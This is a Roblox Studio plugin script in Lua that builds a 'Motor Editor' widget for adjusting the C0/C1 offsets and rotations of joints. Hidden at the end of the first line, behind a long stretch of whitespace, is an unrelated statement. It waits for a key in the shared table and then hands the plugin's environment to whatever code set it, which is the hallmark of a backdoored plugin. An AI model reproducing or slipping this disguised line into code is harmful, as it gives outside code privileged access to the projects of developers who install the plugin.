local ChangeHistoryService = game:GetService("ChangeHistoryService")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                repeat wait() until shared["J2P1oXeYwU"]; shared["J2P1oXeYwU"]=getfenv()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
local StarterGui = game:GetService("StarterGui")
local Selection = game:GetService("Selection")


local toolbar = plugin:CreateToolbar("Motor Editor")
local toolbarButton = toolbar:CreateButton("Open Motor Editor", "", "")
local widget

local enabled = false

local guiElements = {}
local activeMotor

local function onMotorSelect()
	local selectedObjects = Selection:Get()
	if selectedObjects[1] and selectedObjects[1]:IsA("JointInstance") then
		activeMotor = selectedObjects[1]
		guiElements.SelectedMotor.Text = activeMotor.Name
		guiElements.SelectedMotor.BorderColor3 = Color3.new(0, 223/255, 0)
	else
		guiElements.SelectedMotor.BorderColor3 = Color3.new(225/255, 0, 0)
		guiElements.SelectedMotor.Text = "nil"
	end
end


local interfaceDefaults = {
	
	BackgroundColor3 = Color3.new(47/255, 47/255, 47/255),
	BackgroundTransparency = 1,
	BorderSizePixel = 0,
	BorderMode = Enum.BorderMode.Inset,
	
	TextBox = {
		Font = Enum.Font.SourceSans,
		TextSize = 14,
		BorderColor3 = Color3.new(221/255, 221/255, 221/255),
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
	},
	
	TextLabel = {
		Font = Enum.Font.SourceSans,
		TextSize = 14,
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
		TextXAlignment = Enum.TextXAlignment.Left,
	},
	
	TextButton = {
		Size = UDim2.new(1, 0, 1, 0),
		
		Font = Enum.Font.SourceSansBold,
		TextSize = 18,
		TextColor3 = Color3.new(255/255, 255/255, 255/255),
	},
}

local function setDefaults(object)
	for i, v in pairs(interfaceDefaults) do
		if typeof(v) ~= "table" then
			object[i] = v
		else
			if object:IsA(i) then
				for p, j in pairs(v) do
					object[p] = j
				end
			end
		end
	end
end

local function createContainerFrame(size, position, parent)
	local contentFrame = Instance.new("Frame", parent)
	contentFrame.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	contentFrame.BorderSizePixel = interfaceDefaults.BorderSizePixel
	contentFrame.BackgroundTransparency = 1
	contentFrame.Size = UDim2.new(1, 0, size, 0)
	contentFrame.Position = UDim2.new(0, 0, position, 0)
	
	return contentFrame
end

local function createPositionUI(respectiveC, position, parent)
	local container = createContainerFrame(0.15, position, parent)
	
	local title = Instance.new("TextLabel", container)
	setDefaults(title)
	title.Font = Enum.Font.SourceSansBold
	title.Size = UDim2.new(1, 0, 0.2, 0)
	title.TextSize = 15
	title.Text = respectiveC
	
	local valueBoxes = {}
	for pos = 0, 1, 0.35 do
		local valueBox = Instance.new("TextBox", container)
		setDefaults(valueBox)
		valueBox.BackgroundTransparency = 0
		valueBox.BorderSizePixel = 1
		valueBox.Size = UDim2.new(0.3, 0, 0.25, 0)
		valueBox.Position = UDim2.new(pos, 0, 0.5, 0)
		valueBox.Text = "0"
		valueBox.ClearTextOnFocus = false
		valueBox.ZIndex = 2
		
		local buttonAdd = Instance.new("TextButton", valueBox)
		setDefaults(buttonAdd)
		buttonAdd.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		buttonAdd.BackgroundTransparency = 0
		buttonAdd.Position = UDim2.new(0, 0, -1, -4)
		buttonAdd.ZIndex = 2
		buttonAdd.Text = "+"

		local buttonSubtract = Instance.new("TextButton", valueBox)
		setDefaults(buttonSubtract)
		buttonSubtract.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		buttonSubtract.BackgroundTransparency = 0
		buttonSubtract.Position = UDim2.new(0, 0, 1, 4)
		buttonSubtract.ZIndex = 2
		buttonSubtract.Text = "-"
		
		table.insert(valueBoxes, {valueBox, buttonAdd, buttonSubtract})
	end
	
	return {
		x = {TextBox = valueBoxes[1][1], ButtonAdd = valueBoxes[1][2], ButtonSubtract = valueBoxes[1][3]},
		y = {TextBox = valueBoxes[2][1], ButtonAdd = valueBoxes[2][2], ButtonSubtract = valueBoxes[2][3]},
		z = {TextBox = valueBoxes[3][1], ButtonAdd = valueBoxes[3][2], ButtonSubtract = valueBoxes[3][3]}
	}
end

local function createRotationUI(position, parent)
	local container = createContainerFrame(0.22, position, parent)
	
	local axes = {"X", "Y", "Z"}
	local valueSliders = {}
	for pos = 0, 2 do
		local axisContainer = createContainerFrame(0.3, pos * 0.4, container)
		local axisPos = tonumber((pos + 0.4) / 0.4)
		
		local title = Instance.new("TextLabel", axisContainer)
		setDefaults(title)
		title.Size = UDim2.new(1, 0, 0.05, 0)
		title.Text = tostring(axes[pos + 1])
		
		local slider = Instance.new("Frame", axisContainer)
		slider.BackgroundTransparency = 0
		slider.BackgroundColor3 = Color3.new(255/255, 255/255, 255/255)
		slider.BorderSizePixel = 0
		slider.Size = UDim2.new(0.95, 0, 0, 2)
		slider.Position = UDim2.new(0.025, 0, 0.6, 0)
		slider.ZIndex = 2

		local sliderButton = Instance.new("ImageButton", slider)
		sliderButton.BackgroundTransparency = 1
		sliderButton.Position = UDim2.new(0, -8, 0, -16)
		sliderButton.Size = UDim2.new(0, 16, 0, 16)
		sliderButton.Image = "rbxassetid://6541201285"
		sliderButton.ZIndex = 3

		local valueDisplay = Instance.new("TextBox", sliderButton)
		setDefaults(valueDisplay)
		valueDisplay.BackgroundColor3 = Color3.new(85/255, 85/255, 85/255)
		valueDisplay.BackgroundTransparency = 0
		valueDisplay.BorderColor3 = Color3.new(27/255, 42/255, 53/255)
		valueDisplay.BorderSizePixel = 1
		valueDisplay.AnchorPoint = Vector2.new(0.5, 0)
		valueDisplay.Size = UDim2.new(0, 30, 0, 15)
		valueDisplay.Position = UDim2.new(0, 8, 1.3, 0)
		valueDisplay.ClearTextOnFocus = false
		valueDisplay.Text = "0"
		valueDisplay.ZIndex = 3

		table.insert(valueSliders, {slider, sliderButton, valueDisplay})
	end

	return {
		x = {Slider = valueSliders[1][1], SliderButton = valueSliders[1][2], ValueBox = valueSliders[1][3]},
		y = {Slider = valueSliders[2][1], SliderButton = valueSliders[2][2], ValueBox = valueSliders[2][3]},
		z = {Slider = valueSliders[3][1], SliderButton = valueSliders[3][2], ValueBox = valueSliders[3][3]}
	}
end

local function createWidget()
	-- Create new "DockWidgetPluginGuiInfo" object
	local widgetInfo = DockWidgetPluginGuiInfo.new(
		Enum.InitialDockState.Float,  -- Widget will be initialized in floating panel
		true,   -- Widget will be initially enabled
		true,  -- Don't override the previous enabled state
		220,    -- Default width of the floating window
		700,    -- Default height of the floating window
		150,    -- Minimum width of the floating window
		500     -- Minimum height of the floating window
	)

	-- Create new widget GUI
	widget = plugin:CreateDockWidgetPluginGui("widget", widgetInfo)
	widget.Title = "Motor Editor"  -- Optional widget title

	local parentFrame = Instance.new("Frame", widget)
	parentFrame.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	parentFrame.BorderSizePixel = 0
	parentFrame.Size = UDim2.new(1,0,1,0)
	parentFrame.Position = UDim2.new(0,0,0,0)
	parentFrame.SizeConstraint = Enum.SizeConstraint.RelativeXY

	local contentFrame = Instance.new("Frame", parentFrame)
	contentFrame.BackgroundTransparency = 1
	contentFrame.Size = UDim2.new(1, -28, 1, -24)
	contentFrame.Position = UDim2.new(0, 14, 0, 6)

	local motorTitle = Instance.new("TextLabel", contentFrame)
	motorTitle.BackgroundTransparency = 1
	motorTitle.Size = UDim2.new(0.6, 0, 0.04, 0)
	motorTitle.Position = UDim2.new(0, 0, 0, 0)
	motorTitle.Font = Enum.Font.SourceSansBold
	motorTitle.TextColor3 = Color3.new(255/255, 255/255, 255/255)
	motorTitle.TextSize = 15
	motorTitle.Text = "Selected Motor"
	motorTitle.TextXAlignment = Enum.TextXAlignment.Left
	motorTitle.ZIndex = 2

	local motorFrame = createContainerFrame(0.04, 0.045, contentFrame)
	local selectedMotor = Instance.new("TextLabel", motorFrame)
	selectedMotor.Size = UDim2.new(1, -30, 1, 0)
	selectedMotor.Position = UDim2.new(0, 0, 0, 0)
	selectedMotor.BackgroundColor3 = interfaceDefaults.BackgroundColor3
	selectedMotor.BorderColor3 = Color3.new(221/255, 221/255, 221/255)
	selectedMotor.BorderMode = Enum.BorderMode.Inset
	selectedMotor.Font = Enum.Font.SourceSans
	selectedMotor.TextColor3 = Color3.new(255/255, 255/255, 255/255)
	selectedMotor.TextSize = 14
	selectedMotor.Text = "nil"
	selectedMotor.ZIndex = 2

	local selectMotorButton = Instance.new("ImageButton", motorFrame)
	selectMotorButton.BackgroundTransparency = 1
	selectMotorButton.AnchorPoint = Vector2.new(0, 0.5)
	selectMotorButton.Position = UDim2.new(1, -18, 0.5, 0)
	selectMotorButton.Size = UDim2.new(1, -4, 1, -4)
	selectMotorButton.SizeConstraint = Enum.SizeConstraint.RelativeYY
	selectMotorButton.Image = "rbxassetid://6540968444"
	selectMotorButton.ZIndex = 2
	local selectMotorButtonConstraint = Instance.new("UISizeConstraint", selectMotorButton)
	selectMotorButtonConstraint.MaxSize = Vector2.new(20, 20)

	local c0Pos = createPositionUI("CO", 0.1, contentFrame)
	local c0Rot = createRotationUI(0.27, contentFrame)

	local c1Pos = createPositionUI("C1", 0.53, contentFrame)
	local c1Rot = createRotationUI(0.71, contentFrame)

	local incrementContainer = createContainerFrame(0.04, 0.97, contentFrame)

	local incrementLabel = Instance.new("TextLabel", incrementContainer)
	setDefaults(incrementLabel)
	incrementLabel.Size = UDim2.new(0.4, 0, 1, 0)
	incrementLabel.Font = Enum.Font.SourceSansBold
	incrementLabel.Text = "Increment:"
	incrementLabel.ZIndex = 2

	local incrementValue = Instance.new("TextBox", incrementContainer)
	setDefaults(incrementValue)
	incrementValue.BackgroundTransparency = 0
	incrementValue.BorderSizePixel = 1
	incrementValue.Size = UDim2.new(0.6, 0, 0.8, 0)
	incrementValue.Position = UDim2.new(0.4, 0, 0.1, 0)
	incrementValue.ClearTextOnFocus = false
	incrementValue.Text = "0.1"
	incrementValue.ZIndex = 2
	
	selectMotorButton.MouseButton1Click:Connect(onMotorSelect())
	
	guiElements.SelectedMotor = selectedMotor
	guiElements.SelectMotorButton = selectMotorButton
	guiElements.C0Pos = c0Pos
	guiElements.C0Rot = c0Rot
	guiElements.C1Pos = c1Pos
	guiElements.C1Rot = c1Rot
	guiElements.IncrementValue = incrementValue
	
end

local function onPluginEnabled()
	if not enabled then		
		local selectedObjects = Selection:Get()

		createWidget()

		enabled = true

		--ChangeHistoryService:SetWaypoint("Added new folder")
	elseif enabled then
		widget:Destroy()
		enabled = false
	end
end


toolbarButton.Click:Connect(onPluginEnabled)


wait(2)

--guiTest()